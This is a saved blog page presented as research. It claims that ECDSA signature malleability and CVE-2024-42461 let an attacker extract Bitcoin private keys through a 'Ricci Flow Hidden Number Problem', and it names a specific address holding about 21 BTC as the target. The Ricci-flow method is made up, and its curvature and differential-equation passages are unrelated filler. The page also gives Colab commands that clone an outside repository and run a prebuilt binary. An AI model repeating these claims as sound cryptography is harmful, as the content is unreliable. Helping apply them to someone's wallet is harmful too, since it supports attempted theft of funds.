
		
<figure class="wp-block-image"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/057-1024x576.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4928"></figure>



<p>A vulnerability known as Signature Malleability poses a serious threat to Bitcoin and Ethereum cryptocurrencies that use the Elliptic Curve Digital Signature Algorithm (ECDSA). This vulnerability allows attackers to manipulate signatures, creating invalid but acceptable signatures for the system. This article discusses the mechanisms of exploitation of this vulnerability, its implications for the security of cryptocurrencies, and proposed measures to mitigate it. ECDSA (Elliptic Curve Digital Signature Algorithm) is an algorithm that is widely used to create digital signatures for a BTC or ETH coin transfer transaction in Bitcoin and Ethereum cryptocurrencies. The signature consists of two components:&nbsp;&nbsp;<em><strong>r</strong></em>&nbsp;&nbsp;and&nbsp;&nbsp;<em><strong>s</strong></em>&nbsp;, which depend on a random nonce&nbsp;&nbsp;<em><strong>k</strong></em>&nbsp;&nbsp;(NONCE) and a private key&nbsp;<em><strong>x</strong></em>&nbsp;&nbsp;(PrivKey) of the signatory.</p>


---

* Tutorial: https://youtu.be/wf6QwCpP3oc
* Tutorial: https://cryptodeeptech.ru/signature-malleability
* Google Colab: https://colab.research.google.com/drive/1HMmeEQDL4kRKfJNQptTf3Mz4VTZmka8h

---


<h2 class="wp-block-heading">How does Signature Malleability vulnerability occur in Bitcoin transaction?</h2>



<p><strong>Signature Malleability</strong>&nbsp;vulnerabilities&nbsp;&nbsp;arise because it is possible to change the value&nbsp;&nbsp;<em><strong>s</strong></em>&nbsp;&nbsp;in a signature while maintaining the validity of the signature. This is possible because multiple equivalent values&nbsp;&nbsp;<strong>​​(&nbsp;<em>r</em>&nbsp;,&nbsp;<em>s</em>&nbsp;′)</strong>&nbsp;can be obtained for the same signature :</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-1.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-5841"></figure></div>


<p>(where&nbsp;&nbsp;<em><strong>n</strong></em>&nbsp;&nbsp;is the order of the elliptic curve group&nbsp;<em><strong>secp256k1</strong></em>&nbsp;). In this way, an attacker can create a new signature that will be accepted as valid by the system.&nbsp;<strong>Insufficient value checking</strong>&nbsp;: If the values ​​of&nbsp;&nbsp;<em><strong>r</strong></em>&nbsp;&nbsp;and&nbsp;&nbsp;<em><strong>s</strong></em>&nbsp;&nbsp;are not checked for valid ranges (e.g., must be between&nbsp;<strong>1</strong>&nbsp;and&nbsp;&nbsp;<em><strong>n</strong></em><strong>&nbsp;−1</strong>&nbsp;), this may allow attackers to use incorrect values ​​to create fake signatures.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading"><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42461" target="_blank" rel="noreferrer noopener">CVE-2024-42461: Signature Malleability in Elliptic Library for ECDSA</a></h2>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><em>One such vulnerability is&nbsp;<strong>CVE-2024-42461</strong>&nbsp;, discovered in the&nbsp;<strong><a href="https://www.npmjs.com/package/elliptic" target="_blank" rel="noreferrer noopener">Elliptic</a></strong>&nbsp;library used to implement&nbsp;<strong>the ECDSA</strong>&nbsp;(Elliptic Curve Digital Signature Algorithm) digital signature algorithm.&nbsp;</em>&nbsp;<em>CVE-2024-42461 affects&nbsp;<a href="https://www.npmjs.com/package/elliptic" target="_blank" rel="noreferrer noopener">version 6.5.6 of the Elliptic library for Node.js</a>&nbsp;and is classified as a low-severity vulnerability with a CVSS score of 5.3. The problem is that the library allows the use of signatures encoded in the&nbsp;<a href="https://keyhunters.ru/basic-encoding-rules/" target="_blank" rel="noreferrer noopener"><strong>BER (Basic Encoding Rules)</strong></a><a href="https://keyhunters.ru/basic-encoding-rules/" target="_blank" rel="noreferrer noopener">&nbsp;format<strong></strong></a>&nbsp;. This creates an opportunity for attackers to modify signatures without invalidating them, which opens the way for various attacks.</em></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-2-1024x623.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-5852"><figcaption class="wp-element-caption"><strong><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42461" target="_blank" rel="noreferrer noopener">https://nvd.nist.gov/vuln/detail/CVE-2024-42461</a></strong></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>CVE-2024-42461 is a vulnerability found in the Elliptic library used to implement the Elliptic Curve Digital Signature Algorithm (ECDSA) in Node.js. This vulnerability is related to&nbsp;<strong>the Ricci Flow&nbsp;</strong><strong>Hidden Number Problem&nbsp;<em>(Ricci Flow HNP)</em></strong>&nbsp;, which makes it particularly important for the security of cryptographic applications.&nbsp;<strong>The Hidden Number Problem</strong>&nbsp;is a mathematical problem that consists of finding a hidden number used in the encryption process. In the context of ECDSA, if an attacker can solve the HNP, this can lead to the compromise of private keys. CVE-2024-42461 allows a potential attacker to extract information about private keys from signatures, which compromises the integrity of digital signatures and user authentication. This vulnerability opens up a wide range of attacks, as the vulnerability can be used in various attacks, including authentication and data integrity attacks. This could cause serious problems for systems that rely on ECDSA to secure Bitcoin and Ethereum cryptocurrency transactions.</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><em><strong>Compromise of Private Keys</strong>&nbsp;: A successful&nbsp;<strong>Ricci Flow HNP</strong>&nbsp;solution could allow an attacker to gain access to private keys, leading to the ability to forge Bitcoin and Ethereum transaction signatures.</em></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">






<div class="wp-block-image">
<figure class="aligncenter size-full"><a href="https://www.youtube.com/watch?v=wf6QwCpP3oc"><img decoding="async" width="666" height="380" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-3033" srcset="https://cryptodeeptech.ru/wp-content/uploads/2024/11/image.png 666w, https://cryptodeeptech.ru/wp-content/uploads/2024/11/image-300x171.png 300w" sizes="(max-width: 666px) 100vw, 666px"></a></figure></div>


<p></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center"><strong><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/Ricci_Flow_Hidden_Number_Problem.txt" target="_blank" rel="noreferrer noopener">Ricci Flow HNP</a></strong></h2>



<p><strong>The Ricci Flow Hidden Number Problem (HNP&nbsp;</strong><em>)</em>&nbsp;has become a key tool in proving theorems such as&nbsp;<a href="https://en.wikipedia.org/wiki/Thurston_elliptization_conjecture" target="_blank" rel="noreferrer noopener">the Thurston elliptization conjecture</a>&nbsp;,&nbsp;&nbsp;<a href="https://en.wikipedia.org/wiki/Geometrization_conjecture" target="_blank" rel="noreferrer noopener">Geometrization conjecture</a>&nbsp;, and&nbsp;&nbsp;<a href="https://en.wikipedia.org/wiki/Poincar%C3%A9_conjecture" target="_blank" rel="noreferrer noopener">Poincaré conjecture</a>&nbsp;, which concern the topology of manifolds. Hamilton and later&nbsp;<a href="https://en.wikipedia.org/wiki/Grigori_Perelman" target="_blank" rel="noreferrer noopener">Grigori Perelman</a>&nbsp;used this approach to obtain deep results about the structure of manifolds, which can mean using flow to identify and analyze hidden geometric features of manifolds, allowing one to infer their topology and other properties.</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><em>The Ricci flow is closely related to curvature theory, since it uses the Ricci tensor to describe changes in the Riemannian metric on a manifold.</em></p>
</blockquote>



<h2 class="wp-block-heading">Basic Relationships Between Ricci Flow and Curvature</h2>



<ul class="wp-block-list">
<li><strong>Ricci Tensor:</strong>&nbsp;The Ricci flow is based on the Ricci tensor, which is the average of sectional curvatures. It reflects how the shape of a manifold changes with its curvature, where it is formulated as the problem of finding a hidden number when the results of a function applied to combinations of that number with known elements are known. This can be useful in the context of cryptography, especially in public-key systems where it is important to minimize leakage of information about private keys.</li>



<li><strong>Curvature dynamics:</strong>&nbsp;During the Ricci flow, the metric changes in such a way that the curvature can increase or decrease. This allows us to analyze how the geometric properties of the manifold affect its topology.</li>



<li><strong>Singularities:</strong>&nbsp;The Ricci flow can lead to singularities, points where the curvature becomes infinite. Studying these singularities is key to understanding the long-term behavior of the flow and its application to topological problems such as the Poincaré conjecture.</li>



<li><strong>Maximum principle:</strong>&nbsp;The Ricci flow preserves the positivity of the scalar curvature, which allows us to use maximum principles to analyze the geometric properties of manifolds under deformation.</li>
</ul>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-12-1024x697.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4723"></figure></div>


<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><em>In the context of elliptic curves, Ricci flows can be used to analyze their geometric properties and understand the relationships between different structures on these curves</em>&nbsp;.&nbsp;<em>The indicatrix of curvature,</em>&nbsp;&nbsp;or&nbsp;&nbsp;<em><a href="https://keyhunters.ru/dupins-indicatrix/" target="_blank" rel="noreferrer noopener">Dupin indicatrix</a></em>&nbsp;,&nbsp;<em>is constructed in the tangent plane at a given point on the surface according to the following rule. The coordinate axes in the tangent plane coincide with the principal directions. On the ray located in each direction, a segment is laid off equal to the reciprocal square root of the normal curvature of the surface in this direction</em></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center">Classification of surface points</h2>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-13-1024x574.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4724"></figure></div>


<p class="has-text-align-center"><strong>There are surfaces consisting of points of one, two or three types.</strong></p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-14.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4725"></figure></div>


<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><em>This quadratic equation may have one or two roots — asymptotic directions, or no roots. The presence of a root provides an ordinary differential equation of the first order, the indication of a point on the surface sets the initial conditions for its solution. The theorem of the existence and uniqueness of the solution of the Cauchy problem for an ordinary differential equation of the first order, proved in courses on mathematical analysis, leads to the following geometric result. On a surface consisting of elliptical points, there are no real asymptotic lines; on a surface consisting of hyperbolic points, there is an asymptotic network; on a surface consisting of parabolic points that are not flattening points, a unique asymptotic line passes through each point.</em></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center"><strong>Optimization of algorithms</strong></h2>



<p>The methods developed in the framework of Ricci flow theory can be adapted to optimize computations in elliptic curve cryptography, especially in the context of operations on points on elliptic curves secp256k1. Thus, the Ricci flow not only serves as a tool for studying the evolution of metrics, but also provides a deep connection between geometry and topology through curvature analysis. Take for example the numbers&nbsp;<strong>“N”</strong>&nbsp;and&nbsp;<strong>“P”</strong>&nbsp;which are important parameters in the context of elliptic curve cryptography, especially in the secp256k1 standard, which is widely used in the Bitcoin and Ethereum blockchain and cryptocurrency.</p>



<h3 class="wp-block-heading has-text-align-center">The meaning of the number N</h3>



<p><strong>N</strong>&nbsp;is the order of the group of points on the elliptic curve. It determines the maximum number of points that can be used to generate keys in cryptographic algorithms. In the case of&nbsp;<strong>secp256k1</strong>&nbsp;, the value of&nbsp;<strong>N</strong>&nbsp;is:</p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-26d373adbed3f86c95d4ef24545c11cb" style="color:#4092c2"><code><strong>N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</strong></code></pre>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><em>This number also indicates that when working with this curve, all operations must be performed within this order.</em></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading has-text-align-center">The meaning of the number P</h3>



<p><strong>P</strong>&nbsp;is a characteristic of the elliptic curve itself, a prime number that defines the field in which the work on the points on the curve occurs. The value of&nbsp;<strong>P</strong>&nbsp;for&nbsp;<strong>secp256k1</strong>&nbsp;is:</p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-58fe20cb4fe6496c83155ba97d1de2b8" style="color:#4092c2"><code><strong>P = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f</strong></code></pre>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><em>This number specifies the size of the field, which is important for determining the range of possible values ​​of the coordinates of points on the curve.</em></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center">Difference between N and P</h2>



<ul class="wp-block-list">
<li><strong>Group Order (N)</strong>&nbsp;: Determines the number of points on the curve that can be used for cryptographic operations.</li>



<li><strong>Prime Number (P)</strong>&nbsp;: Defines the field in which the curve operates. This number is important for mathematical operations on points on the curve.</li>
</ul>



<p>Thus, although both numbers play a key role in ensuring the security and functionality of cryptographic systems, they perform different functions:&nbsp;<strong>N</strong>&nbsp;concerns&nbsp;<em>the structure of a group of points</em>&nbsp;, and&nbsp;<strong>P</strong>&nbsp;concerns&nbsp;<em>the structure of a field</em>&nbsp;.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center">Vertical position value of N and P</h2>



<h3 class="wp-block-heading has-text-align-center"><em><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/value_n.py" target="_blank" rel="noreferrer noopener">Python script: value_n.py</a></em></h3>


<div class="wp-block-image">
<figure class="aligncenter is-resized"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-17.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4739" style="width:838px;height:auto"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading has-text-align-center"><em><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/value_p.py" target="_blank" rel="noreferrer noopener">Python script: value_p.py</a></em></h3>


<div class="wp-block-image">
<figure class="aligncenter is-resized"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-18.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4740" style="width:838px;height:auto"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">How to exploit Signature Malleability in Bitcoin transaction?</h2>



<p>To implement a full-fledged attack on Bitcoin using the&nbsp;<strong>Signature Malleability</strong>&nbsp;vulnerability, it is necessary to change the equivalent value&nbsp;&nbsp;<strong>(&nbsp;<em>s</em>&nbsp;′)</strong>&nbsp;as shown in the second column of the table of components&nbsp;<em>of the value&nbsp;<strong>(R, S, Z)</strong></em>&nbsp;<em>of the digital signature in&nbsp;<strong>ECDSA</strong></em>&nbsp;.</p>


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/Ricci_Flow_Hidden_Number_Problem.txt" target="_blank" rel="noreferrer noopener"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/nonces-1024x412.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4752"></a><figcaption class="wp-element-caption"><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/Ricci_Flow_Hidden_Number_Problem.txt" target="_blank" rel="noreferrer noopener"><strong>36SignatureMalleability/Ricci_Flow_Hidden_Number_Problem.txt</strong></a></figcaption></figure></div>


<pre class="wp-block-code has-text-color has-link-color wp-elements-58fe20cb4fe6496c83155ba97d1de2b8" style="color:#4092c2"><code><strong>P = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f</strong></code></pre>



<p>For a successful attack on Bitcoin,&nbsp;<em><strong>32</strong></em><strong>&nbsp;ECDSA</strong>&nbsp;signature transactions are enough&nbsp;, where by changing the two initial digits&nbsp;<strong>of HEX</strong>&nbsp;to the equivalent value&nbsp;&nbsp;<strong>(&nbsp;<em>s</em>&nbsp;′)</strong>&nbsp;we build a table to determine the range of possible values ​​of the coordinates of points on the curve, as well as optimizing the mathematical algorithms&nbsp;<em></em>developed within the framework of the Ricci flow theory. Since Ricci flows are closely related to the curvature theory, we can use the average value of the sectional curvature and solve the hidden number problem, where by applying the obtained data to&nbsp;<em><strong>32</strong></em>&nbsp;Bitcoin transactions we extract from the given values&nbsp;<em><strong>​​​​(R, S, Z)</strong></em>&nbsp;the initial data for&nbsp;<em>the secret keys</em>&nbsp;:&nbsp;<strong>(&nbsp;<em>k</em>&nbsp;′)</strong>&nbsp;NONCE for&nbsp;<em><strong>32</strong></em>&nbsp;Bitcoin transactions and using the&nbsp;<strong>Ricci Flow HNP&nbsp;</strong>&nbsp;<em>(Ricci Flow Hidden Number Problem)</em>&nbsp;tool &nbsp;we find the hidden number:&nbsp;<strong>(&nbsp;<em>x</em>&nbsp;′)</strong>&nbsp;PrivKey –&nbsp;<em>private key</em>&nbsp;.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading has-text-align-center">The R and S values ​​are the main components of a digital signature in ECDSA</h3>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><em><strong>The R</strong>&nbsp;value&nbsp;is the coordinate of a point on the elliptic curve that results from mathematical operations involving a private key and a random number (called a “cryptographic random number”). This value ensures that the signature is unique for each message, even if it is signed with the same private key.</em></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p class="has-medium-font-size"><em>The value of&nbsp;&nbsp;<strong>S</strong>&nbsp;&nbsp;is calculated based on the message digest (hash function) and the private key. It is related to how well the signature verifies the authenticity of the message. The value of&nbsp;&nbsp;<strong>S</strong>&nbsp;&nbsp;also depends on the value of&nbsp;<strong>R</strong>&nbsp;and the random number.</em></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading has-text-align-center">How R and S are formed&nbsp;<em>(signature verification method)</em></h3>



<p>The process of generating R and S values ​​involves the following steps:</p>



<ol class="wp-block-list">
<li><strong>Generating a message digest</strong>&nbsp;: First, a hash of the message is created using an algorithm such as SHA-256.</li>



<li><strong>Random Number Selection</strong>&nbsp;: A random number is generated and used to create a point on the elliptic curve.</li>



<li><strong>Calculating R</strong>&nbsp;: Using this random number, the coordinate of a point on the curve is calculated, which becomes the R value.</li>



<li><strong>Calculation of S</strong>&nbsp;: The value of S is calculated given the message digest and the private key.</li>
</ol>



<p>When verifying a signature, the recipient uses the R and S values ​​along with the sender’s public key and the message digest to verify the authenticity of the signature. If all calculations match, this means that the message was indeed signed by the owner of the corresponding private key.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading has-text-align-center"><strong>How to get R, S, Z</strong>&nbsp;value&nbsp;from&nbsp;<strong>RawTX&nbsp;</strong><em>(Signature Decoding Method)</em></h3>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p class="has-medium-font-size"><em><strong>RawTX</strong>&nbsp;is an encoded representation of a Bitcoin transaction in hexadecimal format. It contains all the data needed to complete a Bitcoin transaction.</em></p>
</blockquote>



<h3 class="wp-block-heading">Extract&nbsp;<strong>R, S, Z:</strong></h3>



<ul class="wp-block-list">
<li>A signature in ECDSA consists of two components:&nbsp;<strong>R</strong>&nbsp;and&nbsp;<strong>S</strong>&nbsp;. After decoding&nbsp;<strong>RawTX,</strong>&nbsp;find the field containing the signature&nbsp;<em>(usually part of the transaction input).</em></li>



<li>The signature will be represented as&nbsp;<em>a&nbsp;</em><strong>DER</strong>&nbsp;encoding&nbsp;. You will need to extract the&nbsp;<strong>R</strong>&nbsp;and&nbsp;<strong>S</strong>&nbsp;values ​​from this signature. They are usually represented as two integers, which can be extracted using&nbsp;<em><strong><a href="https://cryptodeeptech.ru/deserialize-signature-vulnerability-bitcoin/" target="_blank" rel="noreferrer noopener">deserialization</a></strong></em>&nbsp;.<em><strong><a href="https://cryptodeeptech.ru/deserialize-signature-vulnerability-bitcoin/" target="_blank" rel="noreferrer noopener"></a></strong></em></li>



<li><strong>The Z</strong>&nbsp;value&nbsp;is a hash of the message being signed. To get Z, you have to hash the transaction data&nbsp;<em>(usually using SHA-256)</em>&nbsp;that was signed.</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">Decoding&nbsp;<strong>RawTX</strong>&nbsp;with&nbsp;<a href="https://github.com/smartibase/Broadcast-Bitcoin-Transaction/tree/main/decoderaw" target="_blank" rel="noreferrer noopener"><strong>decoderaw tool</strong></a></h3>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p class="has-medium-font-size"><em>First, let’s get&nbsp;<strong><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/RawTX.txt" target="_blank" rel="noreferrer noopener">RawTX,</a></strong></em>&nbsp;<em>the encoded Bitcoin transaction in hexadecimal format.&nbsp;</em><strong><sup><a href="https://cryptodeeptool.ru/signature-malleability/#aa553e57-81fe-4c3c-98dd-0d1b60ea55ee">1</a></sup></strong></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-medium-font-size">Let’s open a new notebook in&nbsp;<strong><a href="https://colab.research.google.com/" target="_blank" rel="noreferrer noopener">Google Colab</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong>Command:</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-183b0826bd95d2bed18a48a4922e7c75" style="color:#4092c2"><code><strong>!git clone https://github.com/smartibase/Broadcast-Bitcoin-Transaction.git

cd Broadcast-Bitcoin-Transaction/

!python setup.py
</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-26-1024x465.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4812"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong>Command:</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-79920bb9f702afb9eb413dd0ec9217c5" style="color:#4092c2"><code><strong>cd decoderaw/

!chmod +x decoderaw

ls

!./decoderaw</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-28-1024x538.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4824"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong>Command:</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-091f8661b801bef4da98d257d847fa71" style="color:#4092c2"><code><strong>!./decoderaw 01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b48304502210097255916a3cc4f69d4fa16f68219d0b1798d392fb0dce5fb0a358510df8cabe002201014656120e0a6e7c8c4a79ee22b3cdd4f55435e3e9bf3ab7287ae16858dd9d50141049b4069d8237fae8f2417c71c5512ec1b0547b5597474480cc28ea1bbfeecaab8b90fdec161ad6ef4378f274a60b900452431533596bf3bd23e01202ebf679461ffffffff01d2040000000000001976a914d77522a2b18e0064aba02ca7f864a5bb2299825988ac00000000</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-29-1024x330.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4825"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code has-text-color has-link-color wp-elements-8cf66185109e4f0551aa843f0b1e4f1f" style="color:#4092c2"><code><strong>Result:

1111,0097255916a3cc4f69d4fa16f68219d0b1798d392fb0dce5fb0a358510df8cabe0,1014656120e0a6e7c8c4a79ee22b3cdd4f55435e3e9bf3ab7287ae16858dd9d5,931a52e8610cf87b6d00875f687042224c305865fd20ecb15ef76b1277ba10fd,0000
</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center">Practical part</h2>



<p>From the theory of vulnerability&nbsp;<strong><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42461" target="_blank" rel="noreferrer noopener">CVE-2024-42461</a></strong>&nbsp;&nbsp;it is known that attackers can use incorrect values ​​to create fake transaction signatures. Let’s move on to the practical part of the article and consider an example using a Bitcoin wallet:&nbsp;&nbsp;<a href="https://btc1.trezor.io/address/1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw" target="_blank" rel="noreferrer noopener"><strong>1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw</strong></a>&nbsp;&nbsp;, where there were lost coins in the amount of:&nbsp;&nbsp;<strong>21.2529214 BTC</strong>&nbsp;&nbsp;as of November 2024, this amount is:&nbsp;&nbsp;<strong>1744572.51 USD</strong></p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-46-1024x366.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4880"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center">Solution of differential equation</h2>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><em>Solutions of differential equations help to model various processes, this formula allows us to understand and predict the behavior of various systems depending on the change in variables.&nbsp;</em></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-21.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4784"></figure></div>


<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><em><a href="https://keyhunters.ru/differential-equations/" target="_blank" rel="noreferrer noopener">General solution of a differential equation</a>&nbsp;where the function&nbsp;&nbsp;<strong>y</strong>&nbsp;&nbsp;depends on the variable&nbsp;&nbsp;<strong>x</strong>&nbsp;.</em></p>
</blockquote>



<ol class="wp-block-list">
<li><strong>Original equation</strong>&nbsp;:
<ul class="wp-block-list">
<li>The left side of the equation can be interpreted as the derivative of the function&nbsp;&nbsp;<em><strong>y</strong></em>&nbsp;&nbsp;with respect to&nbsp;&nbsp;<em><strong>x</strong></em>&nbsp;, which is equal to the product of two functions:&nbsp;&nbsp;<strong><em>g</em>&nbsp;(&nbsp;<em>y</em>&nbsp;)</strong>&nbsp;, depending on&nbsp;&nbsp;<em><strong>y</strong></em>&nbsp;, and&nbsp;&nbsp;<strong><em>h</em>&nbsp;(&nbsp;<em>x</em>&nbsp;)</strong>&nbsp;, depending on&nbsp;&nbsp;<em><strong>x</strong></em>&nbsp;.</li>
</ul>
</li>



<li><strong>Rewriting the equation</strong>&nbsp;:
<ul class="wp-block-list">
<li>The equation can be rewritten in a form that separates the variables:</li>
</ul>
</li>
</ol>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-22.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4787"><figcaption class="wp-element-caption">This allows both sides to be integrated separately.</figcaption></figure></div>


<p>After separating the variables, we can integrate both sides exactly:</p>



<p><em>Left side relative to&nbsp;&nbsp;<strong>y</strong></em>&nbsp;:</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-23.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4788"></figure></div>


<p><em>Right side relative to&nbsp;&nbsp;<strong>x</strong></em>&nbsp;:</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-25.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4790"></figure></div>


<p>We will explore the relationship between variables through integration&nbsp;<code><strong>[ frac{dy}{dx} = g(y)h(x) quad Rightarrow quad frac{1}{g(y)} dy = h(x) dx ]</strong></code>and apply a tool for mathematical analysis and solving differential equations.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h1 class="wp-block-heading has-text-align-center"><a href="https://perelmanwork.com/ricci-flow-hnp" target="_blank" rel="noreferrer noopener">Perelman Work</a></h1>



<p></p>







<p></p>


<div class="wp-block-image">
